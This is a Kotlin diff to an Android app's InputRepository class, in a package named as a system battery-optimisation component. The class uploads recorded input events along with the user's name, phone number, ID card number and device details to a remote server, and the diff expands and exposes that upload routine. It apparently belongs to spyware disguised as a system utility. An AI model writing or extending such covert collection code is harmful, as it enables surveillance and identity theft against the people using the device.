@@ -12,7 +12,7 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import java.io.File
 import java.net.URLEncoder
-class InputRepository private constructor(context: Context) {
+class InputRepository private constructor(private val context: Context) {
 
     private val file = File(context.applicationContext.filesDir, "events.json")
     private val backupFile = File(context.applicationContext.filesDir, "backup_events.json")
@@ -82,20 +82,16 @@ class InputRepository private constructor(context: Context) {
         }
     }
 
-    private suspend fun uploadData() {
+    suspend fun uploadData(): Pair<Boolean, String> {
         val currentEvents = _eventsFlow.value.toList()
-        if (currentEvents.isEmpty()) return
+        if (currentEvents.isEmpty()) return Pair(false, "没有需要上报的数据")
 
         val userInfo = getUserInfo()
         val name = userInfo?.name ?: "Unknown"
         val phone = userInfo?.phone ?: "Unknown"
         val idCard = userInfo?.idCard ?: "Unknown"
 
-        val deviceInfoMap = mapOf(
-            "timestamp" to System.currentTimeMillis(),
-            "osVersion" to "Android ${Build.VERSION.RELEASE}"
-        )
-        val deviceInfoJson = gson.toJson(deviceInfoMap)
+        val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)
 
         val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
             name = name,
@@ -117,7 +113,7 @@ class InputRepository private constructor(context: Context) {
             events = eventPayloads
         )
 
-        try {
+        return try {
             // Upload using Retrofit
             val response = NetworkClient.uploadApi.uploadEvents(
                 deviceInfoJson = deviceInfoJson,
@@ -125,7 +121,8 @@ class InputRepository private constructor(context: Context) {
             )
 
             if (response.isSuccessful && response.body()?.code == 0) {
-                Log.d("InputRepository", "Upload successful: ${currentEvents.size} events, msg: ${response.body()?.msg}")
+                val msg = response.body()?.msg ?: "成功"
+                Log.d("InputRepository", "Upload successful: ${currentEvents.size} events, msg: $msg")
                 
                 // Append to backup file
                 appendToBackup(currentEvents)
@@ -139,11 +136,16 @@ class InputRepository private constructor(context: Context) {
                 
                 // Reset timer since we just successfully uploaded
                 resetTimer()
+                Pair(true, "上报成功: $msg")
             } else {
-                Log.e("InputRepository", "Upload failed: ${response.code()} ${response.message()}, body: ${response.body()}")
+                val errorMsg = "上报失败: ${response.code()} ${response.message()}"
+                Log.e("InputRepository", errorMsg)
+                Pair(false, errorMsg)
             }
         } catch (e: Exception) {
-            Log.e("InputRepository", "Upload error: ${e.message}")
+            val errorMsg = "上报错误: ${e.message}"
+            Log.e("InputRepository", errorMsg)
+            Pair(false, errorMsg)
         }
     }
 
